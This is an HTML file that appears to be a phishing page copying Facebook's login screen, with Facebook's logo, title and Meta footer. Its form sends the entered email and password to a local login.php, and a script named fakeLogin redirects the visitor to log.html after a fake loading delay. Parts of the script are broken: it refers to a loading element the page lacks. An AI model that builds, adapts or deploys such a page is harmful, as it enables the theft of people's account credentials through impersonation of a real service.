<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 90vh;
    }
    .login-box, .loading-box {
      background-color: white;
      padding: 30px 25px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 380px;
      text-align: center;
    }
    .login-box img {
      width: 150px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-weight: normal;
      font-size: 20px;
    }
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 95%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }
    .login-box input[type="submit"] {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      font-size: 18px;
      font-weight: bold;
      border-radius: 6px;
      margin-top: 10px;
      cursor: pointer;
    }
    .login-box .links {
      margin-top: 12px;
      font-size: 14px;
    }
    .login-box .links a {
      color: #1877f2;
      text-decoration: none;
      margin: 0 5px;
    }
    footer {
      text-align: center;
      font-size: 12px;
      color: #737373;
      margin-top: 30px;
    }
    footer a {
      margin: 0 4px;
      color: #737373;
      text-decoration: none;
    }
    /* Spinner style */
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #1877f2;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-box {
      display: none;
    }

     @media screen and (max-width: 768px) {
      .login-box {
        padding: 20px;
        width: 90%;
      }
      .login-box img {
        width: 120px;
      }
      .login-box h2 {
        font-size: 18px;
      }
      .login-box input[type="text"],
      .login-box input[type="password"],
      .login-box input[type="submit"] {
        font-size: 14px;
      }
    }

    @media screen and (max-width: 480px) {
      .login-box {
        padding: 15px;
        width: 90%;
      }
      .login-box img {
        width: 100px;
      }
      .login-box h2 {
        font-size: 16px;
      }
      .login-box input[type="text"],
      .login-box input[type="password"],
      .login-box input[type="submit"] {
        font-size: 12px;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Login Form -->
  <div class="login-box" id="loginForm">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <h2>Log Into Facebook</h2>
    <form action="login.php" method="POST">
      <input type="text" name="email" placeholder="Email or phone number" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <input type="submit" value="Log In">
    </form>
    <div class="links">
      <a href="#">Forgot account?</a> · 
      <a href="#">Sign up for Facebook</a>
    </div>
  </div>
</div>

<footer>
  <div>
    English (US) · Filipino · Español · 日本語 · 한국어 · 中文(简体) · العربية · Português (Brasil) · Français (France) · Deutsch
  </div>
  <div style="margin-top: 10px;">
    Sign Up · Log In · Messenger · Facebook Lite · Video · Privacy Policy · Terms · Cookies · About
  </div>
  <div style="margin-top: 10px;">
    Meta © 2025
  </div>
</footer>

<script>
  function fakeLogin() {
    // Hide login form
    document.getElementById('loginForm').style.display = 'none';
    // Show loading screen
    document.getElementById('loadingScreen').style.display = 'block';
    // After 3 seconds, redirect
    setTimeout(function() {
        window.location.href = "log.html";
        // or if you have your own dashboard: "home.html"
    }, 3000);
}
</script>

</body>
</html>
